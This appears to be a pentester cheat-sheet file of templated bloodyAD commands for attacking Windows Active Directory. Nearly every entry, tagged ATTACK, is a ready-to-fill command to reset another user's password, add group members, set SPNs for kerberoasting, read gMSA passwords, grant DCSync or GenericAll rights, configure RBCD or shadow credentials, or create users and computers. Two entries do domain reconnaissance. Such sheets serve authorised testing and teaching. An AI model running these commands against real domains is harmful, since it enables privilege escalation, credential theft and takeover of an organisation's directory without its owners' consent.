# bloodyAD % adcs, certificate, pki, windows, Active directory, template, shadow credential, gmsa, acls
## bloodyAD - set user password
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set password <target-user> <new-password>
```

## bloodyAD - add group member
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add groupMember <target-group> <trustee>
```

## bloodyAD - set user spn
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set object <target-user> serviceprincipalname -v '<service>/<spn>'[]
```

## bloodyAD - read gmsa password
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get object <target-user> --attr msDS-ManagedPassword
```

## bloodyAD - get writable
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get writable
```

## bloodyAD - get object
#plateform/linux #target/remote #cat/RECON
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get object <target-object>
```

## bloodyAD - get trusts
#plateform/linux #target/remote #cat/RECON
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k get trusts --transitive
```

## bloodyAD - set owner
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --dc-ip <target-ip> --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set owner <target-object> <trustee>
```

## bloodyAD - add computer
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add computer <hostname> <computer-password>
```

## bloodyAD - add dcsync
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add dcsync <target-user>
```

## bloodyAD - add genericAll
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add genericAll <target-user> <trustee>
```

## bloodyAD - add rbcd
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add rbcd <target-object> <service>
```

## bloodyAD - add shadow credential
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add shadowCredentials <target-user>
```

## bloodyAD - add uac
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add uac <target-user> -f <property>
```

## bloodyAD - remove uac
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k remove uac <target-user> -f <property>
```

## bloodyAD - add user
#plateform/linux #target/remote #cat/ATTACK
```
bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add user <username> <new-password>
```

